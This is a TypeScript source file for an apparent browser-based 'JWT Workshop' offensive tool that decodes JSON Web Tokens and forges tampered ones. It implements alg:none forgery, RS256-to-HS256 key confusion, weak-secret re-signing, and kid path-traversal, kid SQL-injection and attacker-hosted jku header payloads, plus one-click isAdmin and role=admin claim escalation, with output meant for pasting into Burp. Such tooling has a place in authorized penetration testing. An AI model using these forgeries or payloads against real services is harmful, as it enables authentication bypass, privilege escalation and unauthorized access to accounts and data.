import { h, clear } from '../lib/dom';
import { copyText } from '../lib/copy';
import { toast } from '../lib/toast';
import { t } from '../lib/i18n';
import { ScrollTop } from '../components/scrolltop';

// JWT Workshop — a client-side token crafter. Decode (no verify), tamper claims, then forge:
// alg:none, RS256->HS256 key confusion (HMAC-sign with the RSA public key), weak-secret HS256,
// kid path-traversal / SQLi. All in the browser via WebCrypto. Output a token you paste into Burp.
// The header-mutation buttons are TOGGLES: press to apply (stays lit), press again to remove.

function b64urlFromBytes(bytes: Uint8Array): string {
  let s = '';
  for (const b of bytes) s += String.fromCharCode(b);
  return btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}
function b64urlEncodeStr(str: string): string {
  return b64urlFromBytes(new TextEncoder().encode(str));
}
function b64urlDecodeStr(seg: string): string {
  const s = seg.replace(/-/g, '+').replace(/_/g, '/');
  const pad = s.length % 4 ? '='.repeat(4 - (s.length % 4)) : '';
  try { return decodeURIComponent(escape(atob(s + pad))); } catch { try { return atob(s + pad); } catch { return ''; } }
}
async function hmacSign(signingInput: string, keyBytes: Uint8Array): Promise<string> {
  const key = await crypto.subtle.importKey('raw', keyBytes as BufferSource, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const sig = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(signingInput));
  return b64urlFromBytes(new Uint8Array(sig));
}
const pretty = (s: string): string => { try { return JSON.stringify(JSON.parse(s), null, 2); } catch { return s; } };
const enc = b64urlEncodeStr;

const SAMPLE_HEADER = '{\n  "alg": "HS256",\n  "typ": "JWT"\n}';
const SAMPLE_PAYLOAD = '{\n  "sub": "1234",\n  "name": "user",\n  "role": "user",\n  "isAdmin": false\n}';

const TRAV = '../../../../dev/null';
const SQLI = "x' UNION SELECT 'secret'-- -";
const JKU = 'https://{COLLAB}/jwks.json';

export function JwtLabView(outlet: HTMLElement): () => void {
  clear(outlet);

  const input = h('textarea', { class: 'jwt-input', rows: '3', spellcheck: 'false', placeholder: 'eyJhbGciOi...header.payload.signature' }) as HTMLTextAreaElement;
  const headerTa = h('textarea', { class: 'jwt-ta', rows: '6', spellcheck: 'false' }) as HTMLTextAreaElement;
  const payloadTa = h('textarea', { class: 'jwt-ta', rows: '9', spellcheck: 'false' }) as HTMLTextAreaElement;
  headerTa.value = SAMPLE_HEADER;
  payloadTa.value = SAMPLE_PAYLOAD;

  const outCode = h('code', { class: 'jwt-out-code' });
  const status = h('span', { class: 'jwt-status' });
  let outWrap: HTMLElement | undefined;
  function setOut(token: string, msg = '') { outCode.textContent = token; status.textContent = msg; outWrap?.classList.remove('stale'); }
  // After a real signature, editing a claim/header (alg != none) makes the shown token stale: dim it
  // and warn, so you never copy a signed token that no longer matches the payload above it.
  function markStale() { if (outCode.textContent) { outWrap?.classList.add('stale'); status.textContent = t('jwt.needResign'); } }

  function getParts(): { p: string; hObj: any } | null {
    try { return { p: JSON.stringify(JSON.parse(payloadTa.value)), hObj: JSON.parse(headerTa.value) }; }
    catch { status.textContent = t('jwt.badJson'); return null; }
  }
  const unsigned = (hStr: string, pStr: string): string => enc(hStr) + '.' + enc(pStr) + '.';

  function decode() {
    const parts = input.value.trim().split('.');
    if (parts.length < 2) { status.textContent = t('jwt.badToken'); return; }
    const hd = b64urlDecodeStr(parts[0] ?? '');
    const pl = b64urlDecodeStr(parts[1] ?? '');
    if (!hd || !pl) { status.textContent = t('jwt.badToken'); return; }
    headerTa.value = pretty(hd);
    payloadTa.value = pretty(pl);
    status.textContent = t('jwt.decoded');
    refreshToggles();
  }

  async function forgeHs256(keyBytes: Uint8Array, msg: string) {
    const pr = getParts(); if (!pr) return;
    const hObj = { ...pr.hObj, alg: 'HS256' };
    headerTa.value = pretty(JSON.stringify(hObj));
    refreshToggles();
    const signingInput = enc(JSON.stringify(hObj)) + '.' + enc(pr.p);
    try { const sig = await hmacSign(signingInput, keyBytes); setOut(signingInput + '.' + sig, msg); }
    catch (e) { status.textContent = String(e); }
  }

  // When alg:none is active, re-emit the unsigned token live as you edit claims.
  function autoEmit() {
    try {
      const hd = JSON.parse(headerTa.value);
      if (hd.alg === 'none') { const pr = getParts(); if (pr) setOut(unsigned(JSON.stringify(pr.hObj), pr.p), t('jwt.forgedNone')); }
      else markStale();
    } catch { /* mid-edit */ }
  }
  // One-click claim TOGGLES: press to set the claim (lit), press again to revert it (restores the
  // previous value, or removes the key if it wasn't there). The fields everyone edits by hand.
  function claimToggle(label: string, key: string, valueFn: () => any, tip: string): HTMLButtonElement {
    let applied = false, prev: any, hadPrev = false;
    const btn = h('button', { class: 'jwt-btn', type: 'button', title: tip }, label) as HTMLButtonElement;
    btn.addEventListener('click', () => {
      let p: any;
      try { p = JSON.parse(payloadTa.value); } catch { status.textContent = t('jwt.badJson'); return; }
      if (!applied) {
        hadPrev = Object.prototype.hasOwnProperty.call(p, key); prev = p[key];
        p[key] = valueFn(); applied = true; btn.classList.add('on'); status.textContent = t('jwt.claimSet');
      } else {
        if (hadPrev) p[key] = prev; else delete p[key];
        applied = false; btn.classList.remove('on'); status.textContent = t('jwt.claimRemoved');
      }
      payloadTa.value = pretty(JSON.stringify(p)); autoEmit();
    });
    return btn;
  }

  const mkBtn = (label: string, title: string, on: () => void) => h('button', { class: 'jwt-btn', type: 'button', title, onclick: on }, label);

  // ---- toggleable attack buttons (press to apply + stay lit, press again to remove) ----
  const algNoneBtn = mkBtn(t('jwt.algNone'), t('jwt.algNoneTip'), () => {
    const pr = getParts(); if (!pr) return;
    const turningOn = pr.hObj.alg !== 'none';
    const hObj = { ...pr.hObj, alg: turningOn ? 'none' : 'HS256' };
    headerTa.value = pretty(JSON.stringify(hObj));
    refreshToggles();
    if (turningOn) setOut(unsigned(JSON.stringify(hObj), pr.p), t('jwt.forgedNone'));
    else markStale(); // turned alg:none off -> a previously signed token is now stale (or no-op if none)
  });
  const kidTravBtn = mkBtn(t('jwt.kidTrav'), t('jwt.kidTravTip'), () => toggleKey('kid', TRAV));
  const kidSqliBtn = mkBtn(t('jwt.kidSqli'), t('jwt.kidSqliTip'), () => toggleKey('kid', SQLI));
  const jkuBtn = mkBtn(t('jwt.kidJku'), t('jwt.kidJkuTip'), () => toggleKey('jku', JKU));

  function toggleKey(key: string, value: string) {
    const pr = getParts(); if (!pr) return;
    const hObj = { ...pr.hObj };
    const removing = hObj[key] === value;
    if (removing) delete hObj[key]; else hObj[key] = value;
    headerTa.value = pretty(JSON.stringify(hObj));
    refreshToggles();
    status.textContent = removing ? t('jwt.kidRemoved') : t('jwt.kidSet');
    autoEmit(); // header changed -> re-emit (alg:none) or mark a prior signed token stale
  }
  function refreshToggles() {
    let hd: any = {};
    try { hd = JSON.parse(headerTa.value); } catch { /* mid-edit */ }
    algNoneBtn.classList.toggle('on', hd.alg === 'none');
    kidTravBtn.classList.toggle('on', hd.kid === TRAV);
    kidSqliBtn.classList.toggle('on', hd.kid === SQLI);
    jkuBtn.classList.toggle('on', typeof hd.jku === 'string');
  }

  const attackRow = h('div', { class: 'jwt-attacks' }, algNoneBtn, kidTravBtn, kidSqliBtn, jkuBtn);
  const claimRow = h('div', { class: 'jwt-claims' },
    h('span', { class: 'jwt-claims-label' }, t('jwt.claimsTitle')),
    claimToggle('isAdmin=true', 'isAdmin', () => true, t('jwt.claimTip')),
    claimToggle('role=admin', 'role', () => 'admin', t('jwt.claimTip')),
    claimToggle('exp +1h', 'exp', () => Math.floor(Date.now() / 1000) + 3600, t('jwt.claimExpTip')));

  const secretInp = h('input', { class: 'jwt-key-inp', placeholder: t('jwt.secretPh'), spellcheck: 'false' }) as HTMLInputElement;
  const pubkeyTa = h('textarea', { class: 'jwt-key-ta', rows: '3', spellcheck: 'false', placeholder: '-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----' }) as HTMLTextAreaElement;

  const secretRow = h('div', { class: 'jwt-key-row' },
    h('span', { class: 'jwt-key-label' }, 'HS256'), secretInp,
    mkBtn(t('jwt.sign'), t('jwt.signTip'), () => forgeHs256(new TextEncoder().encode(secretInp.value), t('jwt.signedSecret'))));
  const pubRow = h('div', { class: 'jwt-key-row col' },
    h('span', { class: 'jwt-key-label' }, t('jwt.confusion')), pubkeyTa,
    mkBtn(t('jwt.forge'), t('jwt.confusionTip'), () => forgeHs256(new TextEncoder().encode(pubkeyTa.value.trim() + '\n'), t('jwt.forgedConfusion'))));

  const outCopy = h('button', { class: 'jwt-out-copy icon-copy', type: 'button', title: t('jwt.copy'),
    onclick: () => { copyText(outCode.textContent || ''); toast(t('jwt.copied')); } }, '⧉');
  const useBtn = mkBtn(t('jwt.useAsInput'), t('jwt.useAsInputTip'), () => { input.value = outCode.textContent || ''; toast(t('jwt.loaded')); });

  input.addEventListener('input', () => { if (input.value.includes('.')) decode(); });
  headerTa.addEventListener('input', () => { refreshToggles(); autoEmit(); });
  payloadTa.addEventListener('input', () => autoEmit());

  const content = h('div', { class: 'content jwt-lab' },
    h('h1', { class: 'cat-h' }, 'JWT Workshop'),
    h('div', { class: 'script-intro' }, t('jwt.howto')),
    h('label', { class: 'jwt-flabel' }, t('jwt.pasteLabel')),
    input,
    h('div', { class: 'jwt-grid' },
      h('div', {}, h('div', { class: 'jwt-sec-h' }, 'Header'), headerTa),
      h('div', {}, h('div', { class: 'jwt-sec-h' }, 'Payload'), payloadTa)),
    h('div', { class: 'jwt-sec-h' }, t('jwt.attacksTitle')),
    h('div', { class: 'jwt-attacks-hint' }, t('jwt.attacksHint')),
    attackRow,
    claimRow,
    secretRow,
    pubRow,
    h('div', { class: 'jwt-sec-h' }, t('jwt.outTitle')),
    (outWrap = h('div', { class: 'jwt-out' }, outCode, outCopy)),
    h('div', { class: 'jwt-out-foot' }, status, useBtn));
  outlet.appendChild(content);
  const scrollTop = ScrollTop();
  outlet.appendChild(scrollTop.el);

  refreshToggles();
  return () => scrollTop.destroy();
}
